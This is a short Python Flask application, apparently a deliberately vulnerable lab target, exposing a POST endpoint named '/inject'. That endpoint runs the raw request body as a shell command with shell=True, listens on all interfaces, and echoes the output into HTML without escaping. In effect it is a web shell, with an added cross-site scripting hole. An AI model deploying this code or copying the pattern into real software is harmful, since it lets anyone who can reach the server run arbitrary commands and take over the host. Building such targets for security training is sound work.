import os
import subprocess

from datetime import datetime

from flask import Flask, abort, request

app = Flask(__name__)


@app.route("/inject", methods=["POST"])
def inject():
    data = request.get_data()
    process = subprocess.Popen(
        data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = process.stdout.read().decode()
    stderr = process.stderr.read().decode()

    output = f"<h2>stdout</h2><pre>{stdout}</pre>"
    output += f"<h2>stderr</h2><pre>{stderr}</pre>"
    return f"{output}"


if __name__ == '__main__':
    os.setuid(1000)
    app.run(host='0.0.0.0')
